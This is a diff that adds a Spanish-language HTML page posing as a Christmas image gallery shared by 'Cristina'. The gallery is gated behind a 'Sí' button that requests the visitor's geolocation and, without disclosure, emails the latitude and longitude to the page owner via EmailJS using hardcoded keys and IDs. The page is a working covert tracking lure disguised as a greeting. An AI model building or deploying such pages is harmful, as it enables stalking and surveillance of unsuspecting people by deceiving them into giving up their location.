@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Navidad y felicidad</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            color: #333;
+        }
+        header {
+            background-color: #d32f2f;
+            color: #fff;
+            padding: 10px;
+            text-align: center;
+        }
+        main {
+            padding: 20px;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 15px;
+            transition: all 0.3s ease-in-out;
+            visibility: hidden; /* Inicialmente está oculta */
+        }
+        .gallery img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .location {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://media.istockphoto.com/id/1051910494/es/foto/marco-de-navidad-de-abeto-rojo-y-oro-decoraciones-de-navidad-en-espacio-en-blanco.jpg?s=612x612&w=0&k=20&c=CoPssY1ffQRszAlGs1tuMFyikJAi7VmIt4PNBbszOGM=');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .location h1 {
+            color: black;
+        }
+        .location button {
+            width: 220px;
+            height: 60px;
+            background-color: #f44336;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .location button:hover {
+            background-color: #b71c1c;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Navidad y amistad</h1>
+        <p>Un espacio lleno de imágenes que inspiran el espíritu navideño y la felicidad.</p>
+    </header>
+    <main>
+        <h2>Galería</h2>
+        <div class="gallery" id="gallery">
+            <img src="https://elcomercio.pe/resizer/v2/7CRZMLKAEZCMFEW4RDZU6CMA54.jpg?auth=ea3c8e445e8422faaa5eeba67a5f95da9a0caea622aa01e3c12dfa8020aeb344&width=280&height=158&quality=75&smart=true" alt="Decoración navideña 1">
+            <img src="https://invitacionesnavidad.com/wp-content/uploads/2023/12/Frases-de-Navidad-Cortas-1.jpg" alt="Decoración navideña 2">
+            <img src="https://content.clara.es/medio/2024/11/04/frase-navidad_ed161be6_241104083011_800x800.webp" alt="Navidad y Amor">
+            <img src="https://i.ytimg.com/vi/gXTLUynQvno/mqdefault.jpg" alt="Amor Navideño">
+        </div>
+        <div class="location">
+            <h1>¿Quieres ver las imágenes que Cristina quiere compartir contigo?</h1>
+            <button id="getLocation" aria-label="Permitir acceso para ver las imágenes">Sí</button>
+        </div>
+    </main>
+
+    <script>
+        emailjs.init("Uf-YRyG4GM8j3YpZP"); // Inicializa EmailJS con tu clave pública
+
+        const button = document.getElementById('getLocation');
+        const gallery = document.getElementById('gallery');
+        const fullscreenDiv = document.querySelector('.location');
+
+        button.addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        fullscreenDiv.style.display = 'none'; // Oculta el div de ubicación
+                        gallery.style.visibility = 'visible'; // Muestra la galería
+
+                        const latitud = position.coords.latitude;
+                        const longitud = position.coords.longitude;
+
+                        // Enviar la ubicación a EmailJS
+                        emailjs.send("service_lushimk", "template_uodxsum", {
+                            latitud: latitud,
+                            longitud: longitud,
+                        })
+                        .then((response) => {
+                            console.log("Correo enviado con éxito:", response.status, response.text);
+                        })
+                        .catch((error) => {
+                            console.error("Error al enviar el correo:", error);
+                        });
+                    },
+                    () => {
+                        alert("Debes permitir el acceso a la ubicación para ver las imágenes.");
+                    }
+                );
+            } else {
+                alert("La geolocalización no está disponible en este navegador.");
+            }
+        });
+    </script>
+</body>
+</html>
